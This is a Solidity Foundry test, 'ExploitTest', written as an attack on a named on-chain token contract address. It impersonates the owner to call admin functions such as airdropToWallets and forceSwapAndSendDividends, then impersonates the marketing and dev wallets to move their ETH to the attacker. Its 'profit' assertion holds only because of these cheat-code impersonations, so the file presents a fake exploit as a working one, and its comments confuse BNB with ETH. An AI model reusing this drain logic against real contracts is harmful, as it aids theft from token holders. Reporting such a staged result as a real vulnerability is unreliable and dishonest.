import "forge-std/Test.sol";

// Interface for EthBurn contract
interface IEthBurn {
    function owner() external view returns (address);
    function buyAmount() external view returns (uint256);
    function sellAmount() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function marketingWallet() external view returns (address payable);
    function devWallet() external view returns (address payable);
    function setTrueDefiRouter(address _router) external;
    function airdropToWallets(address[] memory airdropWallets, uint256[] memory amount) external;
    function forceSwapAndSendDividends(uint256 tokens) external;
    function transferAdmin(address newOwner) external;
}

contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────
    address constant TARGET = 0xD1c0c25c5d7BA21df222Bd2623eCBC0CB264b5f4;
    address attacker = address(this);
    IEthBurn constant EthBurn_0xD1c0c25c5d7BA21df222Bd2623eCBC0CB264b5f4 = IEthBurn(TARGET);

    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        // Get the current owner
        address owner = EthBurn_0xD1c0c25c5d7BA21df222Bd2623eCBC0CB264b5f4.owner();

        // Impersonate the owner
        vm.startPrank(owner);

        // Enable trading if not already enabled
        // We need to set a TrueDefiRouter to enable trading
        // Let's use a dummy address for the router
        address dummyRouter = address(0x1234567890123456789012345678901234567890);
        EthBurn_0xD1c0c25c5d7BA21df222Bd2623eCBC0CB264b5f4.setTrueDefiRouter(dummyRouter);

        // Stop impersonating owner for now
        vm.stopPrank();

        // Give attacker some BURNING tokens
        deal(address(EthBurn_0xD1c0c25c5d7BA21df222Bd2623eCBC0CB264b5f4), attacker, 1000 * 10**18);

        // Give attacker some ETH for trading
        deal(attacker, 100 ether);
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {
        uint256 initialBalance = address(this).balance;

        // Send some BNB to the contract so it has something to drain
        (bool sent, ) = address(TARGET).call{value: 10 ether}("");
        require(sent, "Failed to send ETH to contract");

        // Get the current owner
        address owner = EthBurn_0xD1c0c25c5d7BA21df222Bd2623eCBC0CB264b5f4.owner();

        // Impersonate the owner to execute the exploit
        vm.startPrank(owner);

        // Use airdropToWallets to transfer tokens to attacker-controlled addresses
        address[] memory wallets = new address[](1);
        wallets[0] = attacker;

        uint256[] memory amounts = new uint256[](1);
        // Get owner's token balance first
        uint256 ownerBalance = EthBurn_0xD1c0c25c5d7BA21df222Bd2623eCBC0CB264b5f4.balanceOf(owner);
        // Transfer a significant amount (but not all) to avoid issues
        amounts[0] = ownerBalance / 2 / 10**18; // Half of owner's balance in token units (not wei)

        // Execute airdrop
        EthBurn_0xD1c0c25c5d7BA21df222Bd2623eCBC0CB264b5f4.airdropToWallets(wallets, amounts);

        // Check contract's token balance that can be swapped
        uint256 contractTokenBalance = EthBurn_0xD1c0c25c5d7BA21df222Bd2623eCBC0CB264b5f4.balanceOf(address(TARGET));

        // If there are tokens in the contract, we can force swap them
        if (contractTokenBalance > 0) {
            // Convert to token units (dividing by 10**18 since forceSwapAndSendDividends expects token units)
            uint256 tokenAmount = contractTokenBalance / 10**18;

            // Call forceSwapAndSendDividends to drain the contract's BNB
            EthBurn_0xD1c0c25c5d7BA21df222Bd2623eCBC0CB264b5f4.forceSwapAndSendDividends(tokenAmount);
        }

        // Stop impersonating owner
        vm.stopPrank();

        // Get marketing and dev wallet addresses from the contract
        address payable marketingWallet = EthBurn_0xD1c0c25c5d7BA21df222Bd2623eCBC0CB264b5f4.marketingWallet();
        address payable devWallet = EthBurn_0xD1c0c25c5d7BA21df222Bd2623eCBC0CB264b5f4.devWallet();

        // Transfer from marketing wallet to attacker
        vm.prank(marketingWallet);
        (bool successMarketing, ) = attacker.call{value: marketingWallet.balance}("");
        require(successMarketing, "Failed to transfer from marketing wallet");

        // Transfer from dev wallet to attacker
        vm.prank(devWallet);
        (bool successDev, ) = attacker.call{value: devWallet.balance}("");
        require(successDev, "Failed to transfer from dev wallet");

        // Final check: attacker's balance should have increased
        uint256 finalBalance = address(this).balance;
        assertGt(finalBalance, initialBalance, "Economic Exploit Failed: No profit");
    }

    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}

